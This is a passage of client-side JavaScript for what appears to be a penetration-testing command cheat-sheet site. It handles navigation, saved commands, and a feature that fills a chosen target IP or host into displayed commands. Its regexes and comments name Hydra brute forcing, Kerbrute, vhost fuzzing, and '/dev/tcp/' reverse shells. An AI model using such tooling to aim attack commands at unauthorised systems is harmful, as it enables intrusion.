          l.classList.toggle('is-active', l.dataset.section === id);
        });
      }
    });
  }, { rootMargin: '-15% 0px -75% 0px' });

  sidebarLinks.forEach(link => {
    const sec = document.getElementById(link.dataset.section);
    if (sec) observer.observe(sec);
    link.addEventListener('click', (e) => {
      e.preventDefault();
      if (sec) sec.scrollIntoView({ behavior: 'smooth', block: 'start' });
      // Close mobile drawer
      document.getElementById('tool-sidebar')?.classList.remove('is-open');
      document.getElementById('sidebar-overlay')?.classList.remove('is-active');
    });
  });
});

/* ── 6. MOBILE NAVIGATION DRAWER & OVERLAYS ─────────────── */
document.addEventListener('DOMContentLoaded', () => {
  const hamburger = document.getElementById('nav-hamburger');
  const mobileDrawer = document.getElementById('nav-mobile-drawer');
  const sidebar = document.getElementById('tool-sidebar');
  const overlay = document.getElementById('sidebar-overlay');

  if (hamburger) {
    hamburger.addEventListener('click', () => {
      if (sidebar) {
        // On tool pages, hamburger toggles sidebar
        const open = sidebar.classList.toggle('is-open');
        overlay?.classList.toggle('is-active', open);
        hamburger.setAttribute('aria-expanded', open);
      } else if (mobileDrawer) {
        // On home page, hamburger toggles top nav drawer
        const open = mobileDrawer.classList.toggle('is-open');
        hamburger.setAttribute('aria-expanded', open);
      }
    });
  }

  if (overlay) {
    overlay.addEventListener('click', () => {
      sidebar?.classList.remove('is-open');
      overlay.classList.remove('is-active');
      if (hamburger) hamburger.setAttribute('aria-expanded', false);
    });
  }
});

/* ── 7. FAVORITES & PINNED COMMANDS SYSTEM ─────────────── */
const FAVS_KEY = 'opkit-saved-commands';

function getFavorites() {
  try {
    const raw = localStorage.getItem(FAVS_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch (e) {
    return [];
  }
}

function saveFavorites(items) {
  try {
    localStorage.setItem(FAVS_KEY, JSON.stringify(items));
  } catch (e) {
    console.error('Could not save favorites', e);
  }
  updateFavoritesUI();
}

function isCommandFavorited(cmd) {
  const items = getFavorites();
  return items.some(i => i.cmd === cmd);
}

function toggleFavorite(cmd, toolName = '') {
  let items = getFavorites();
  const existingIdx = items.findIndex(i => i.cmd === cmd);
  if (existingIdx >= 0) {
    items.splice(existingIdx, 1);
    showCopyToast('Removed from saved commands');
  } else {
    items.push({
      cmd,
      tool: toolName || detectToolName(),
      savedAt: Date.now()
    });
    showCopyToast('★ Command saved to favorites');
  }
  saveFavorites(items);
}

function detectToolName() {
  const title = document.querySelector('.tool-hero__title');
  if (title) return title.textContent.trim();
  const h1 = document.querySelector('h1');
  return h1 ? h1.textContent.trim().split(' ')[0] : 'Command';
}

function updateFavoritesUI() {
  const items = getFavorites();
  const count = items.length;

  // Update badge in nav
  const badge = document.querySelector('.nav__fav-badge');
  if (badge) {
    badge.textContent = count;
    badge.classList.toggle('has-items', count > 0);
  }

  // Update star buttons on page
  document.querySelectorAll('.code-line').forEach(line => {
    const code = line.querySelector('.code-line__code');
    const btn = line.querySelector('.code-line__fav-btn');
    if (code && btn) {
      const isFav = isCommandFavorited(code.textContent.trim());
      btn.classList.toggle('is-fav', isFav);
      btn.setAttribute('aria-label', isFav ? 'Remove from favorites' : 'Save command');
      btn.setAttribute('title', isFav ? 'Remove from favorites' : 'Save command');
      btn.innerHTML = isFav
        ? `<svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`
        : `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`;
    }
  });

  // Render items in drawer
  renderFavoritesDrawerList();
}

function renderFavoritesDrawerList() {
  const body = document.querySelector('.fav-drawer__body');
  const countLabel = document.querySelector('.fav-drawer-count');
  if (!body) return;

  const items = getFavorites();
  if (countLabel) countLabel.textContent = `${items.length}`;

  if (!items.length) {
    body.innerHTML = `
      <div class="fav-empty-state">
        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
        <p>No saved commands yet.</p>
        <p style="margin-top:6px;font-size:12px;opacity:0.7">Click the star icon (☆) next to any command across OPKIT to pin it here for rapid operational access.</p>
      </div>
    `;
    return;
  }

  body.innerHTML = items.map((item, idx) => `
    <div class="fav-item" data-idx="${idx}">
      <div class="fav-item__top">
        <span class="fav-item__tool">${escapeHtml(item.tool || 'Command')}</span>
        <button class="fav-item__remove" aria-label="Remove" title="Remove" data-cmd="${escapeHtml(item.cmd)}">&times;</button>
      </div>
      <div class="fav-item__code">${escapeHtml(item.cmd)}</div>
      <button class="fav-item__copy-btn" data-cmd="${escapeHtml(item.cmd)}">
        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
        Copy
      </button>
    </div>
  `).join('');
}

function escapeHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function initFavoritesDOM() {
  // Inject fav button into nav if not present
  const navInner = document.querySelector('.nav__inner');
  const themeBtn = document.querySelector('.nav__theme-btn');
  if (navInner && !document.getElementById('nav-fav-btn')) {
    const favBtn = document.createElement('button');
    favBtn.id = 'nav-fav-btn';
    favBtn.className = 'nav__fav-btn';
    favBtn.setAttribute('aria-label', 'Saved Commands');
    favBtn.setAttribute('title', 'View Saved Commands');
    favBtn.innerHTML = `
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
      <span class="nav__fav-badge" aria-hidden="true">0</span>
    `;
    if (themeBtn) {
      navInner.insertBefore(favBtn, themeBtn);
    } else {
      navInner.appendChild(favBtn);
    }
  }

  // Inject Drawer & Backdrop into body if not present
  if (!document.querySelector('.fav-drawer')) {
    const backdrop = document.createElement('div');
    backdrop.className = 'fav-drawer-backdrop';
    document.body.appendChild(backdrop);

    const drawer = document.createElement('div');
    drawer.className = 'fav-drawer';
    drawer.innerHTML = `
      <div class="fav-drawer__header">
        <div class="fav-drawer__title">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#f59e0b" stroke="#f59e0b" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
          Saved Commands
          <span class="fav-drawer-count">0</span>
        </div>
        <button class="fav-drawer__close" aria-label="Close saved commands">&times;</button>
      </div>
      <div class="fav-drawer__body"></div>
      <div class="fav-drawer__footer">
        <button class="fav-btn-action fav-btn-action--primary" id="fav-copy-all">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
          Copy All
        </button>
        <button class="fav-btn-action fav-btn-action--secondary" id="fav-clear-all">
          Clear All
        </button>
      </div>
    `;
    document.body.appendChild(drawer);

    // Close actions
    const closeBtn = drawer.querySelector('.fav-drawer__close');
    const closeDrawer = () => {
      drawer.classList.remove('is-open');
      backdrop.classList.remove('is-open');
    };
    closeBtn?.addEventListener('click', closeDrawer);
    backdrop.addEventListener('click', closeDrawer);

    // Copy all
    drawer.querySelector('#fav-copy-all')?.addEventListener('click', () => {
      const items = getFavorites();
      if (!items.length) {
        showCopyToast('No commands to copy');
        return;
      }
      const fullText = items.map(i => `# [${i.tool}]\n${i.cmd}`).join('\n\n');
      copyText(fullText);
      showCopyToast(`Copied ${items.length} saved commands`);
    });

    // Clear all
    drawer.querySelector('#fav-clear-all')?.addEventListener('click', () => {
      if (getFavorites().length === 0) return;
      if (confirm('Clear all saved commands?')) {
        saveFavorites([]);
        showCopyToast('All saved commands cleared');
      }
    });

    // Toggle drawer open
    document.getElementById('nav-fav-btn')?.addEventListener('click', () => {
      drawer.classList.add('is-open');
      backdrop.classList.add('is-open');
    });

    // Esc closes drawer
    document.addEventListener('keydown', e => {
      if (e.key === 'Escape' && drawer.classList.contains('is-open')) {
        closeDrawer();
      }
    });
  }

  // Attach Star buttons to all code lines
  document.querySelectorAll('.code-line').forEach(line => {
    if (!line.querySelector('.code-line__fav-btn')) {
      const code = line.querySelector('.code-line__code');
      if (!code) return;
      const cmdText = code.textContent.trim();
      const isFav = isCommandFavorited(cmdText);

      const favBtn = document.createElement('button');
      favBtn.className = `code-line__fav-btn ${isFav ? 'is-fav' : ''}`;
      favBtn.setAttribute('aria-label', isFav ? 'Remove from favorites' : 'Save command');
      favBtn.setAttribute('title', isFav ? 'Remove from favorites' : 'Save command');
      favBtn.innerHTML = isFav
        ? `<svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`
        : `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`;

      favBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        toggleFavorite(code.textContent.trim());
      });

      const copyBtn = line.querySelector('.code-line__copy-btn');
      if (copyBtn) {
        line.insertBefore(favBtn, copyBtn);
      } else {
        line.appendChild(favBtn);
      }
    }
  });

  // Drawer delegation for remove and copy
  document.addEventListener('click', e => {
    const removeBtn = e.target.closest('.fav-item__remove');
    if (removeBtn) {
      const cmd = removeBtn.dataset.cmd;
      if (cmd) toggleFavorite(cmd);
      return;
    }
    const copyFavBtn = e.target.closest('.fav-item__copy-btn');
    if (copyFavBtn) {
      const cmd = copyFavBtn.dataset.cmd;
      if (cmd) copyText(cmd, copyFavBtn);
      return;
    }
  });

  updateFavoritesUI();
}

document.addEventListener('DOMContentLoaded', initFavoritesDOM);

/* ── 8. DYNAMIC TARGET IP & VARIABLE INJECTION SYSTEM ─────── */
const TARGET_IP_KEY = 'opkit-target-ip';

function getTargetIp() {
  try {
    return localStorage.getItem(TARGET_IP_KEY) || '';
  } catch (e) {
    return '';
  }
}

function setTargetIp(val) {
  const clean = val ? val.trim() : '';
  try {
    if (clean) {
      localStorage.setItem(TARGET_IP_KEY, clean);
    } else {
      localStorage.removeItem(TARGET_IP_KEY);
    }
  } catch (e) {
    console.error('Could not save target IP', e);
  }
  applyTargetToDOM(clean);
}

function parseTargetInput(raw) {
  if (!raw) return null;
  let str = String(raw).trim();
  if (!str) return null;

  // Strip trailing slashes
  str = str.replace(/\/+$/, '');

  let protocol = '';
  let port = '';
  let path = '';
  let host = str;

  // Protocol? e.g. http:// or https:// or ssh://
  const protoMatch = host.match(/^([a-z0-9+-]+):\/\/(.*)$/i);
  if (protoMatch) {
    protocol = protoMatch[1].toLowerCase();
    host = protoMatch[2];
  }

  // Path? e.g. target.com/app
  const pathIdx = host.indexOf('/');
  if (pathIdx !== -1) {
    path = host.slice(pathIdx);
    host = host.slice(0, pathIdx);
  }

  // Port? e.g. 10.10.10.1:8080 or box.htb:8080
  const portMatch = host.match(/^(.*?):(\d+)$/);
  if (portMatch) {
    host = portMatch[1];
    port = portMatch[2];
  }

  // IPv4 breakdown for .254 boundary target template
  const ipv4Match = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  let ip254 = '';
  if (ipv4Match) {
    const p1 = parseInt(ipv4Match[1], 10);
    const p2 = parseInt(ipv4Match[2], 10);
    const p3 = parseInt(ipv4Match[3], 10);
    const p4 = parseInt(ipv4Match[4], 10);
    if (p1 <= 255 && p2 <= 255 && p3 <= 255 && p4 <= 255) {
      ip254 = `${p1}.${p2}.${p3}.254`;
    }
  }

  const fullHost = port ? `${host}:${port}` : host;
  const effectiveProto = protocol || 'https';
  const url = `${effectiveProto}://${fullHost}${path}`;

  return {
    raw: str,
    host: host,
    fullHost: fullHost,
    port: port,
    ip254: ip254 || host,
    protocol: effectiveProto,
    path: path,
    url: url
  };
}

function replaceTargetInText(text, info) {
  if (!text || !info || !info.host) return text;
  let out = text;
  const fullVal = info.fullHost;
  const hostVal = info.host;

  // 1. Explicit placeholders: <target>, <target-ip>, <target_ip>, <target_url>, TARGET_IP
  out = out.replace(/(?:&lt;|<)target(?:-ip|_ip|-host|_host)?(?:&gt;|>)/gi, fullVal);
  out = out.replace(/(?:&lt;|<)TARGET(?:_IP)?(?:&gt;|>)/g, fullVal);
  out = out.replace(/(?:&lt;|<)target_url(?:&gt;|>)/gi, info.url);
  out = out.replace(/\bTARGET_IP\b/g, fullVal);

  // 2. URLs: http:// or https:// followed by target domain/template IP
  out = out.replace(/(https?:\/\/)(?:target\.com|target\.htb|victim\.com|10\.10\.10\.10|10\.10\.10\.1|target(?=[/:?"'\s]|$))/gi,
    (m, p1) => `${p1}${fullVal}`);

  // 3. Protocol URIs: ssh://, rdp://, smb://, mysql://, postgres://, etc.
  out = out.replace(/((?:ssh|ftp|rdp|mysql|postgres|smb|vnc|telnet|https?-get):\/\/)(?:10\.0\.0\.5|10\.0\.10\.1|10\.0\.10\.5|10\.10\.10\.1|10\.10\.10\.10|target\.com|target\.htb|target(?=[/:?"'\s]|$))/gi,
    (m, p1) => `${p1}${fullVal}`);

  // 4. Hydra positional target before http-post-form
  out = out.replace(/(\b)(?:10\.0\.10\.1|10\.0\.10\.5|target)(\s+https?-post-form)/gi,
    (m, p1, p2) => `${p1}${fullVal}${p2}`);

  // 5. Tool-specific flags:
  const legbaTarget = info.port ? info.fullHost : `${info.host}:22`;
  out = out.replace(/(--target\s+)10\.0\.10\.1(?::22)?/gi,
    (m, p1) => `${p1}${legbaTarget}`);

  out = out.replace(/(--dc\s+)10\.0\.10\.2/gi,
    (m, p1) => `${p1}${hostVal}`);

  out = out.replace(/(-d\s+|--domain\s+)(?:target\.com|target\.htb|target\b)/gi,
    (m, p1) => `${p1}${hostVal}`);

  out = out.replace(/(Host:\s*FUZZ\.)(?:target\.com|target\.htb|target\b)/gi,
    (m, p1) => `${p1}${hostVal}`);

  out = out.replace(/\btftp\.target\.com\b/gi, `tftp.${hostVal}`);

  // 6. Target template IPs: 10.10.10.1, 10.10.10.10, 10.10.10.254, 10.0.10.1, 10.0.10.5, 10.0.0.5
  out = out.replace(/(?<!10\.0\.0\.[12],)(?<!10\.10\.14\.)(?<!\/dev\/tcp\/)(?<!LHOST[=\s]+)(?<!LHOST<[^>]+>[=\s]*)(?<!LHOST[^>]*>[\s]*)\b(10\.10\.10\.1|10\.10\.10\.10|10\.10\.10\.254|10\.0\.10\.1|10\.0\.10\.5|10\.0\.0\.5)\b(?![/-])/gi,
    (m, p1) => (p1 === '10.10.10.254' ? (info.ip254 || hostVal) : hostVal));

  // 7. Standalone target.com / target.htb / victim.com
  out = out.replace(/(^|[^/a-zA-Z0-9_.])(?:target\.com|target\.htb|victim\.com)(?=[^a-zA-Z0-9_.]|$)/gi,
    (m, p1) => `${p1}${hostVal}`);

  return out;
}

function replaceTargetInHtml(html, info) {
  if (!html || !info || !info.host) return html;

  let out = html;
  const varSpan = (val) => `<span class="tok-target-var">${escapeHtml(val)}</span>`;
  const hostVal = varSpan(info.host);
  const fullVal = varSpan(info.fullHost);

  // 1. Explicit placeholders: &lt;target&gt;, <target>, <target-ip>, <target_ip>, TARGET_IP, etc.
  out = out.replace(/(?:&lt;|<)target(?:-ip|_ip|-host|_host)?(?:&gt;|>)/gi, fullVal);
  out = out.replace(/(?:&lt;|<)TARGET(?:_IP)?(?:&gt;|>)/g, fullVal);
  out = out.replace(/(?:&lt;|<)target_url(?:&gt;|>)/gi, varSpan(info.url));
  out = out.replace(/\bTARGET_IP\b/g, fullVal);

  // 2. URLs: http:// or https:// followed by target domain/template IP
  // MUST NOT match 127.0.0.1!
  out = out.replace(/(https?:\/\/)(?:target\.com|target\.htb|victim\.com|10\.10\.10\.10|10\.10\.10\.1|target(?=[/:?"'\s<>&]|$))/gi,
    (m, p1) => `${p1}${fullVal}`);

  // 3. Protocol URIs: ssh://, rdp://, smb://, mysql://, postgres://, http-get://, https-get://
  out = out.replace(/((?:ssh|ftp|rdp|mysql|postgres|smb|vnc|telnet|https?-get):\/\/)(?:10\.0\.0\.5|10\.0\.10\.1|10\.0\.10\.5|10\.10\.10\.1|10\.10\.10\.10|target\.com|target\.htb|target(?=[/:?"'\s<>&]|$))/gi,
    (m, p1) => `${p1}${fullVal}`);

  // 4. Hydra target positional argument: e.g. "10.0.10.1 http-post-form" or "target http-post-form"
  out = out.replace(/(?:10\.0\.10\.1|10\.0\.10\.5|target)((\s*(?:<[^>]+>\s*)*)https?-post-form)/gi,
    (m, p1) => `${fullVal}${p1}`);

  // 5. Tool-specific flags:
  // Legba --target 10.0.10.1:22
  const legbaTarget = info.port ? info.fullHost : `${info.host}:22`;
  out = out.replace(/(--target(?:\s*<[^>]+>\s*|\s+))10\.0\.10\.1(?::22)?/gi,
    (m, p1) => `${p1}${varSpan(legbaTarget)}`);

  // Kerbrute --dc 10.0.10.2
  out = out.replace(/(--dc(?:\s*<[^>]+>\s*|\s+))10\.0\.10\.2/gi,
    (m, p1) => `${p1}${hostVal}`);

  // Gobuster / Ffuf domain flags: -d target.com, -d target.htb, --domain target.com
  out = out.replace(/(-d\s+|--domain\s+)(?:target\.com|target\.htb|target\b)/gi,
    (m, p1) => `${p1}${hostVal}`);

  // Host header vhost fuzzing: "Host: FUZZ.target" or "Host: FUZZ.target.com"
  out = out.replace(/(Host:\s*FUZZ\.)(?:target\.com|target\.htb|target\b)/gi,
    (m, p1) => `${p1}${hostVal}`);

  // TFTP target: tftp.target.com
  out = out.replace(/\btftp\.target\.com\b/gi, `tftp.${hostVal}`);

  // 6. Target template IPs: 10.10.10.1, 10.10.10.10, 10.10.10.254, 10.0.10.1, 10.0.10.5, 10.0.0.5
  // Negative lookbehinds prevent matching decoys (10.0.0.1,10.0.0.2), attacker IP (10.10.14.5), reverse shells (/dev/tcp/10.10.14.5), and LHOST
  // Negative lookahead prevents matching subnets (/24) and ranges (-50)
  out = out.replace(/(?<!10\.0\.0\.[12],)(?<!10\.10\.14\.)(?<!\/dev\/tcp\/)(?<!LHOST[=\s]+)(?<!LHOST<[^>]+>[=\s]*)(?<!LHOST[^>]*>[\s]*)\b(10\.10\.10\.1|10\.10\.10\.10|10\.10\.10\.254|10\.0\.10\.1|10\.0\.10\.5|10\.0\.0\.5)\b(?![/-])/gi,
    (m, p1) => {
      const val = (p1 === '10.10.10.254') ? (info.ip254 || info.host) : info.host;
      return varSpan(val);
    });

  // 7. Standalone target.com / target.htb / victim.com
  out = out.replace(/(^|[^/a-zA-Z0-9_.])(?:target\.com|target\.htb|victim\.com)(?=[^a-zA-Z0-9_.]|$)/gi,
    (m, p1) => `${p1}${hostVal}`);

  return out;
}

function applyTargetToDOM(targetVal) {
  const info = parseTargetInput(targetVal);

  const codeElements = document.querySelectorAll('.code-line__code, .cheat-cell__code');
  codeElements.forEach(el => {
    if (!el.dataset.originalHtml) {
      el.dataset.originalHtml = el.innerHTML;
    }
  });

  let updatedCount = 0;

  if (!info) {
    codeElements.forEach(el => {
      if (el.dataset.originalHtml) {
        el.innerHTML = el.dataset.originalHtml;
      }
    });
  } else {
    codeElements.forEach(el => {
      const orig = el.dataset.originalHtml || el.innerHTML;
      const replaced = replaceTargetInHtml(orig, info);
      if (replaced !== orig) {
        el.innerHTML = replaced;
        updatedCount++;
      } else {
        el.innerHTML = orig;
      }
    });
  }

  updateTargetInputsAndUI(targetVal, updatedCount, info);

  if (typeof updateFavoritesUI === 'function') {
    updateFavoritesUI();
  }
}

function updateTargetInputsAndUI(targetVal, updatedCount, info) {
  const cleanVal = targetVal ? targetVal.trim() : '';
  const hasTarget = Boolean(cleanVal && info);

  // Sync Nav Input
  const navInput = document.getElementById('nav-target-input');
  const navContainer = document.getElementById('nav-target-container');
  if (navInput && navInput.value !== cleanVal) {
    navInput.value = cleanVal;
  }
  if (navContainer) {
    navContainer.classList.toggle('has-target', hasTarget);
  }

  // Sync Page Target Bar
  const pageInput = document.getElementById('page-target-input');
  const pageBar = document.getElementById('target-bar');
  const statusEl = document.getElementById('target-bar-status');
  if (pageInput && pageInput.value !== cleanVal) {
    pageInput.value = cleanVal;
  }
  if (pageBar) {
    pageBar.classList.toggle('is-active', hasTarget);
  }
  if (statusEl) {
    if (hasTarget) {
      statusEl.innerHTML = `
        <span class="target-status-dot"></span>
        <span class="target-status-text">Active: ${escapeHtml(info.fullHost)} (${updatedCount} commands injected)</span>
      `;
    } else {
      statusEl.innerHTML = `
        <span class="target-status-dot"></span>
        <span class="target-status-text">Default template</span>
      `;
    }
  }
}

function injectNavTarget() {
  if (document.getElementById('nav-target-container')) return;

  const navInner = document.querySelector('.nav__inner');
  if (!navInner) return;

  const navTarget = document.createElement('div');
  navTarget.className = 'nav__target';
  navTarget.id = 'nav-target-container';
  navTarget.innerHTML = `
    <div class="nav__target-wrap">
      <svg class="nav__target-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
        <circle cx="12" cy="12" r="10"/>
        <line x1="22" y1="12" x2="18" y2="12"/>
        <line x1="6" y1="12" x2="2" y2="12"/>
        <line x1="12" y1="6" x2="12" y2="2"/>
        <line x1="12" y1="22" x2="12" y2="18"/>
      </svg>
      <input
        id="nav-target-input"
        class="nav__target-input"
        type="text"
        placeholder="Target IP / Host…"
        autocomplete="off"
        spellcheck="false"
        aria-label="Target IP or hostname"
        title="Set engagement target IP/host (e.g. 10.129.2.15)"
      >
      <button id="nav-target-clear" class="nav__target-clear" aria-label="Clear target IP" title="Reset target IP" type="button">&times;</button>
    </div>
  `;

  const searchEl = navInner.querySelector('.nav__search');
  if (searchEl && searchEl.nextSibling) {
    navInner.insertBefore(navTarget, searchEl.nextSibling);
  } else {
    const themeBtn = navInner.querySelector('.nav__theme-btn');
    if (themeBtn) {
      navInner.insertBefore(navTarget, themeBtn);
    } else {
      navInner.appendChild(navTarget);
    }
  }

  const input = navTarget.querySelector('#nav-target-input');
  const clearBtn = navTarget.querySelector('#nav-target-clear');

  let debounceTimer = null;
  input.addEventListener('input', () => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      setTargetIp(input.value);
    }, 100);
  });

  input.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      clearTimeout(debounceTimer);
      setTargetIp(input.value);
      input.blur();
    } else if (e.key === 'Escape') {
      setTargetIp('');
      input.blur();
    }
  });

  clearBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    setTargetIp('');
    input.focus();
  });
}

function injectPageTargetBar() {
  if (document.getElementById('target-bar')) return;

  const toolHero = document.querySelector('.tool-content > .tool-hero, .tool-hero');
  if (!toolHero) return;

  const bar = document.createElement('div');
  bar.className = 'target-bar';
  bar.id = 'target-bar';
  bar.setAttribute('role', 'region');
  bar.setAttribute('aria-label', 'Target scope configuration');
  bar.innerHTML = `
    <div class="target-bar__inner">
      <div class="target-bar__info">
        <div class="target-bar__badge">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <circle cx="12" cy="12" r="10"/>
            <line x1="22" y1="12" x2="18" y2="12"/>
            <line x1="6" y1="12" x2="2" y2="12"/>
            <line x1="12" y1="6" x2="12" y2="2"/>
            <line x1="12" y1="22" x2="12" y2="18"/>
          </svg>
          <span>TARGET SCOPE</span>
        </div>
        <div class="target-bar__label">Set target IP/host to auto-fill every command on this page:</div>
      </div>
      <div class="target-bar__controls">
        <div class="target-bar__input-wrap">
          <svg class="target-bar__input-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/>
          </svg>
          <input
            id="page-target-input"
            class="target-bar__input"
            type="text"
            placeholder="e.g. 10.129.2.15 or box.htb"
            autocomplete="off"
            spellcheck="false"
            aria-label="Target IP or hostname for in-page commands"
          >
          <button id="page-target-clear" class="target-bar__clear-btn" aria-label="Clear target IP" title="Reset to default">&times;</button>
        </div>
        <div class="target-bar__status" id="target-bar-status">
          <span class="target-status-dot"></span>
          <span class="target-status-text">Default template</span>
        </div>
      </div>
    </div>
    <div class="target-bar__presets">
      <span class="target-bar__presets-label">Quick samples:</span>
      <button type="button" class="target-preset-chip" data-target="10.129.2.15">10.129.2.15 (HTB)</button>
      <button type="button" class="target-preset-chip" data-target="10.10.11.200">10.10.11.200</button>
      <button type="button" class="target-preset-chip" data-target="192.168.1.100">192.168.1.100 (LAN)</button>
      <button type="button" class="target-preset-chip" data-target="target.local">target.local</button>
    </div>
  `;

  toolHero.insertAdjacentElement('afterend', bar);

  const input = bar.querySelector('#page-target-input');
  const clearBtn = bar.querySelector('#page-target-clear');

  let debounceTimer = null;
  input.addEventListener('input', () => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      setTargetIp(input.value);
    }, 100);
  });

  input.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      clearTimeout(debounceTimer);
      setTargetIp(input.value);
      input.blur();
    } else if (e.key === 'Escape') {
      setTargetIp('');
      input.blur();
    }
  });

  clearBtn.addEventListener('click', () => {
    setTargetIp('');
    input.focus();
  });

  bar.querySelectorAll('.target-preset-chip').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetVal = btn.dataset.target;
      if (targetVal) {
        setTargetIp(targetVal);
      }
    });
  });
}

function initTargetSystem() {
  injectNavTarget();
  injectPageTargetBar();

  const stored = getTargetIp();
  applyTargetToDOM(stored);

  // Cross-tab synchronization
  window.addEventListener('storage', e => {
    if (e.key === TARGET_IP_KEY) {
      applyTargetToDOM(e.newValue || '');
    }
  });
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initTargetSystem);
} else {
  initTargetSystem();
}



